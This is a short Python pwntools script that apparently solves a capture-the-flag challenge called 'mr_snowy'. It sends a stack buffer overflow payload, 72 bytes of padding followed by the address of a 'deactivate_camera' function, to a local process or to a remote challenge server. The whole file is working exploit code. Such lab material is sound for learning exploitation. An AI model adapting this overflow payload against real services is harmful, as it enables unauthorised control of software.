import pwn

elf = pwn.context.binary = pwn.ELF("mr_snowy")
if pwn.args.REMOTE:
    p = pwn.remote("206.189.124.137", 32761)
else:
    p = elf.process()
p.recvuntil(b">")
p.sendline(b"1")
p.recvuntil(b">")
payload = b"A"*64
payload += b"A"*8
payload += pwn.p64(elf.sym['deactivate_camera'])
p.sendline(payload)
p.interactive()
